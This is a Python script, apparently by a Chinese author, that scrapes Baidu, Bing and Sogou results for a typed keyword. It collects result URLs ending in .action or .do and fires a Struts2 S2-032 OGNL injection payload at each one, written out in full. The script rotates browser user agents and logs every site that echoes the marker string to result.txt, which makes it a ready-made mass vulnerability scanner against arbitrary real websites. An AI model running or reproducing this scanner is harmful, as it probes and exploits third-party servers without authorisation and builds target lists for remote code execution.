#!/usr/bin/env python33+
# -*- coding:utf-8 -*-
#codeby     道长且阻
#email      ydhcui@suliu.net/QQ664284092
#website    http://www.suliu.net

import requests

import threading
import queue
import re
import urllib
import time
import random

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser 5.0',
    'IBM WebExplorer /v0.94', 'Galaxy/1.0 [en] (Mac OS X 10.5.6; U; en)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
    'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; TheWorld)']

class BaseEngine(threading.Thread):
    Queue = queue.Queue(0)
    BACKLIST = []
    def __init__(self):
        threading.Thread.__init__(self)
        if not(self.baseurl and self.nextkey):
            raise Exception('self.baseurl 没有初始化')
        self.url = None
        self.keyword = None
        self.timeout = 10
        self.timesleep = 60
        self.errorflag = 5
        self.session = requests.Session()
        self.lock = threading.Lock()
        self.headers = {}

    def search(self,keyword):
        if keyword:
           self.keyword = urllib.parse.quote(keyword)
           self.start()
    def run(self):
        self.url = self.baseurl.format(keyword = self.keyword, page = self.page*self.pageflag)
        self.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': self.url,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'cn-ZH,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'})
        html = self.gethtml(self.url)
        if html:
           self.parse(html)
           if self.nextpage(html):
              self.run()
    def gethtml(self,url):
        html = None
        if self.errorflag:
            try:
                res = self.session.get(url, headers = self.headers, timeout = self.timeout)
                if hasattr(res,'text'):
                    html = res.text
                    html = html.encode().decode('utf8','ignore')
                else:
                    html = res.content
                    try:
                       html.decode(res.encodeing)
                    except Exception as e:
                       print(e)
            except Exception as e:
                print(e)
                self.errorflag -= 1
                time.sleep(self.timesleep)
                html = self.nextkey
        return html
    def puturl(self,url):
        self.lock.acquire()
        if url and url not in self.BACKLIST:
           self.BACKLIST.append(url)
           self.Queue.put(url)
        self.lock.release()
    def nextpage(self,html):
        self.page += 1
        if html.find(self.nextkey)!=-1:
           return True
    def parse(self,html):
        '''
        自定义搜索引擎url匹配规则
        然后调用self.puturl(url)加入队列
        '''
        pass

class BaiduEngine(BaseEngine):#baidu
    def __init__(self):
        self.baseurl = "http://www.baidu.com/s?wd={keyword}&pn={page}"
        self.nextkey = "class=\"n\">"
        self.page = 0
        self.pageflag = 10
        BaseEngine.__init__(self)
    def parse(self,html):
        url = None
        for value in re.findall("<a target=\"_blank\" href=\"([^<]*)\" class=\"c-showurl\"",html):
            try:
                res = self.session.get(value,allow_redirects=False)
                url = res.headers.get('Location')
            except Exception as e:
                print(e)
            self.puturl(url)

class BingEngine(BaseEngine):#bing
    def __init__(self):
        self.baseurl = "http://cn.bing.com/search?q={keyword}&first={page}"
        self.nextkey = "class=\"sb_pagN\""
        self.page = 1
        self.pageflag = 10
        BaseEngine.__init__(self)
    def parse(self,html):
        link1 = re.findall("<div class=\"b_title\"><h2><a href=\"(.*?)\"",html)
        link2 = re.findall("<li class=\"b_algo\"><h2><a href=\"(.*?)\"",html)
        for url in link1+link2:
            self.puturl(url)

class SougouEngine(BaseEngine):#sougou error? why
    def __init__(self):
        self.baseurl = "http://www.sogou.com/web?query={keyword}&page={page}"
        self.nextkey = "id=\"sogou_next\""
        self.page = 1
        self.pageflag = 1
        BaseEngine.__init__(self)
    def parse(self,html):
        link = re.findall("<a name=\"dttl\" target=\"_blank\" href=\"([^<]*)\" id=\"",html)
        for url in link:
            self.puturl(url)

class SoEngine(BaseEngine):#360
    def __init__(self):
        self.baseurl = "http://www.so.com/s?q={keyword}&pn={page}"
        self.nextkey = "id=\"snext\""
        self.page = 1
        self.pageflag = 1
        BaseEngine.__init__(self)
    def parse(self,html):
        link = re.findall("<a href=\"([^<]*)\" data-res=",html)
        for url in link:
            self.puturl(url.split('"')[0])

class YoudaoEngine(BaseEngine):
    def __init__(self):
        self.baseurl = "http://www.youdao.com/search?q={keyword}&start={page}"
        self.nextkey = "class=\"next-page\""
        self.page = 0
        self.pageflag = 10
        BaseEngine.__init__(self)
    def parse(self,html):
        link = re.findall("<a href=\"([^<]*)\" id=\"hitURL\$pos\"",html)
        for url in link:
            self.puturl(url)


if __name__=='__main__':
    key = input(u'wsh>输入关键字>')
    for SE in [SougouEngine,BingEngine,BaiduEngine]:
        SE().search(key)

    payload = ("method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=%23%23%23Struts2S2-032test%23%23%23")
    regex = r'([\S\s]*?\.action)[\S\s]*?|([\S\s]*?\.do)[\S\s]*?'

    while True:
        try:
            url = SE.Queue.get()
            print(url)
            if re.search(regex, url):
                res = requests.get(url.split('?')[0]+'?'+payload).text
                if 'Struts2S2-032test' in res:
                    with open('result.txt','a') as f:
                        f.write(url)
                        f.write('\n')
                        f.close()
        except Exception as e:
            print(e)



